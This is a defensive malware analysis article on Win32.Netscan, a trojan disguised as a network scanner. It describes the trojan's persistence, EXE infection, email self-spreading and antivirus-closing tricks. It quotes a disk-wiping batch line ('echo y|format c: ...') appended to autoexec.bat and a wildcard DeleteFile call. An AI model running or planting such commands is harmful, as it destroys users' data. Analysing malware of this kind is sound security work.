# Analyzing Win32.Netscan, A Malicious Network Scanner with Destructive Payloads

## Overview
At first glance, **Win32.Netscan** presents itself as a harmless freeware utility meant to "scan your system" when you connect to a network. However, a closer examination of its source code reveals a multi-faceted piece of malware designed to propagate itself, compromise system stability, and even potentially render a system unusable.

## Infection and Persistence
One of the first operations carried out by the malware is to determine its own file path (using `SearchPath`) and then modify the system registry for persistence. Depending on the operating system version (Windows NT or 9x), it writes an entry into either:

- `Software\Microsoft\WindowsNT\CurrentVersion\RunServices`
- `Software\Microsoft\Windows\CurrentVersion\RunServices`

This ensures that the malware automatically executes every time the system starts.

Beyond persistence, the malware is designed to **infect other executables**. By navigating to the Windows directory, it enumerates all `*.exe` files and copies itself over them—except for specific system files like `emm386.exe` and `setver.exe`. Notably, it even **preserves the original file timestamps** to avoid immediate detection by casual users or basic security scans.

## Email Propagation via MAPI
Win32.Netscan employs a **social engineering tactic** by prompting the user to select an email address from their address book. Once an address is selected, it uses functions from the **MAPI library**—specifically, `MAPISendMail` and `MAPIResolveName`—to send an email with the following details:

- **Subject:** `Microsoft NetScan Utility`
- **Body:** Poses as Microsoft technical support, urging the recipient to respond to a "network test."
- **Attachment:** A copy of the malware itself.

This allows the malware to spread further by exploiting the trust associated with personal and professional email contacts.

## Anti-Virus and System Sabotage
The malware takes significant steps to **evade detection and disable countermeasures**:

- **Stealth Tactics:** It invokes the Windows API function `RegisterServiceProcess` to potentially hide its process from the task manager.
- **Priority Escalation:** The infected process is set to run with `REALTIME_PRIORITY_CLASS`, ensuring it gains substantial CPU time—at the risk of destabilizing the host system.
- **Anti-Antivirus Measures:** The malware actively searches for windows with titles corresponding to well-known antivirus software (e.g., **"Norton AntiVirus"** and **Symantec Security Updates**) and **forcibly closes them**.
  - In one instance, it mocks the user for employing Norton, displaying a message box before closing the program’s window.

## Destructive Payloads and Timed Triggers
Aside from spreading and maintaining persistence, **Win32.Netscan includes several destructive payloads**:

### **CD Drive Manipulation**
At precisely **12:12 PM (system time)**, it uses multimedia control functions (`mciSendString`) to **open and close the CD drive door repeatedly**, likely as a nuisance tactic.

### **Formatting Command**
Perhaps the most dangerous part of the code is the scheduled execution **on the first day of the month**. When the system date is `1`, the malware writes a command to the end of `autoexec.bat`:

```batch
 echo y|format c: /u /v:HaHaHaHa
```

This command attempts to **format the C drive**, leading to potential **complete data loss**.

Additionally, in several error-handling branches, the code attempts to execute:

```c
DeleteFile("*.*");
```

suggesting a deliberate intent to **erase files under certain conditions**.

## Conclusion
Win32.Netscan is a **multi-purpose malware** that combines self-replication, social engineering, anti-detection tactics, and **destructive payloads** into one package. By masquerading as a legitimate network diagnostic tool and employing deceptive email propagation methods, it not only **compromises the host machine** but also leverages the **trust** inherent in personal and professional networks.

Its aggressive measures—such as **infecting executables, disabling antivirus programs, and scheduling destructive commands**—underscore the importance of **robust security practices** and the need for **up-to-date protection** against such threats.

Understanding and recognizing the various techniques employed by malware like Win32.Netscan is crucial for both **cybersecurity professionals** and **everyday users**, highlighting why caution is necessary when encountering unsolicited "utilities" or unexpected system prompts.
